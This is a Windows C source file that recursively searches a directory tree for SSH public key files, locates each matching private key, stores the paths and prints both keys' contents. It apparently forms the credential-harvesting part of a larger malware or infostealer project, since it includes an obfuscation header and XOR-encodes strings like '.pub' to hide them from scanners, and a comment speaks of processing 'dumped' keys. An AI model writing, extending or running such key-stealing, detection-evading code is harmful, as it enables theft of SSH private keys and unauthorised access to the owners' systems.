#include "find_ssh_key.h"

#include <shlwapi.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <windows.h>

#include "extract_file.h"
#include "obfuscation.h"
static void find_keys_pair(const WCHAR *directory, const WCHAR *pkName,
                           size_t lenPkFile, sshkey keysTab[MAX_KEY_FILES],
                           DWORD32 *index) {
  WCHAR *skName = malloc(sizeof(WCHAR) * lenPkFile - 3);
  if (skName == NULL) {
    printf("[Error] find_key_pair: malloc for skName failed.\n");
    return;
  }

  WCHAR skNamePath[MAX_PATH];
  WCHAR pkNamePath[MAX_PATH];

  // Copying the public key file into secret key
  // And removing the .pub
  wcsncpy(skName, pkName, lenPkFile - 4);
  skName[lenPkFile - 4] = L'\0';
  // Getting the path name of the ssh keysImagine
  _snwprintf(skNamePath, sizeof(skNamePath), L"%ls\\%ls", directory, skName);
  _snwprintf(pkNamePath, sizeof(pkNamePath), L"%ls\\%ls", directory, pkName);

  free(skName);

  // Checking if the secret key exists
  DWORD attributes = GetFileAttributesW(skNamePath);
  if (attributes == INVALID_FILE_ATTRIBUTES ||
      (attributes & FILE_ATTRIBUTE_DIRECTORY)) {
    wchar_t error_msg[] =
        L"[ERROR] find_key_pair: couldn't find private key for %ls\n";
    // XOR_STR(error_msg, wcslen(error_msg));
    wprintf(error_msg, pkNamePath);
    return;
  }

  DWORD32 lenPkNamePath = wcslen(pkNamePath);
  DWORD32 lenSkNamePath = wcslen(skNamePath);

  // Copying the keys path name if we got the secret and the public keys
  keysTab[*index].publicKeyPath = malloc(sizeof(WCHAR) * (lenPkNamePath + 1));
  wcsncpy(keysTab[*index].publicKeyPath, pkNamePath, lenPkNamePath);
  keysTab[*index].publicKeyPath[lenPkNamePath] = L'\0';

  keysTab[*index].secretKeyPath = malloc(sizeof(WCHAR) * wcslen(skNamePath));
  wcsncpy(keysTab[*index].secretKeyPath, skNamePath, lenSkNamePath);
  keysTab[*index].secretKeyPath[lenSkNamePath] = L'\0';

  wprintf(
      L"[DEBUG] find_key_pair: Keys pair found: \nindex = %u\n\t%ls\n\t%ls\n\n",
      *index, keysTab[*index].publicKeyPath, keysTab[*index].secretKeyPath);

  // incrementing the index
  (*index)++;
}

static void find_ssh_key_recursively(const PWSTR directory,
                                     sshkey keysFilenamesTab[MAX_KEY_FILES],
                                     DWORD32 *indexKeysTab) {
  WIN32_FIND_DATAW findData;
  HANDLE hFind;
  // char searchPath[MAX_PATH];
  WCHAR searchPath[MAX_PATH];
  // Building search path
  _snwprintf(searchPath, sizeof(searchPath), L"%s\\*", directory);

  // Searching recursively
  hFind = FindFirstFileW(searchPath, &findData);
  if (hFind == INVALID_HANDLE_VALUE) {
    return;
  }

  // Looping on all the file
  do {
    const WCHAR *fileName = findData.cFileName;

    wchar_t single_dot[] = L"\x04";      // .
    wchar_t double_dot[] = L"\x04\x04";  // ..
    XOR_WSTR(single_dot, wcslen(single_dot));
    XOR_WSTR(double_dot, wcslen(double_dot));

    // Ignore "." and ".."
    if (wcscmp(fileName, single_dot) == 0 ||
        wcscmp(fileName, double_dot) == 0) {
      continue;
    }

    // Check the filetype (file or directory)
    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
      WCHAR subDirectory[MAX_PATH];
      _snwprintf(subDirectory, sizeof(subDirectory), L"%ls\\%ls", directory,
                 fileName);

      // Repeat the process on the subdirectories
      find_ssh_key_recursively(subDirectory, keysFilenamesTab, indexKeysTab);
    } else {
      size_t lenFileName = wcslen(fileName);

      // checking if the end of the file is .pub
      // i.e. ssh public key
      // also checking if we can store more keys

      wchar_t file_extension[] = L"\x04\x5a\x5f\x48";  // .pub
      XOR_STR(file_extension, wcslen(file_extension));

      if (*indexKeysTab >= MAX_KEY_FILES) {
        break;
      } else if (wcscmp(fileName + (lenFileName - 4), file_extension) == 0) {
        wprintf(L"File : %ls\\%ls\n", directory, fileName);
        find_keys_pair(directory, fileName, lenFileName, keysFilenamesTab,
                       indexKeysTab);
      }
    }
  } while (FindNextFileW(hFind, &findData) != 0);
  FindClose(hFind);
}

void find_ssh_key(const PWSTR directory) {
  sshkey keysFilenamesTab[MAX_KEY_FILES] = {0};
  DWORD32 indexKeysTab = 0;
  find_ssh_key_recursively(directory, keysFilenamesTab, &indexKeysTab);
  DWORD32 lenKeysTab = indexKeysTab;

  // Code part where we process with the dumped keys filenames.
  // here we just print the file
  for (unsigned int i = 0; i < lenKeysTab; i++) {
    print_file(keysFilenamesTab[i].publicKeyPath);
    print_file(keysFilenamesTab[i].secretKeyPath);
  }
}
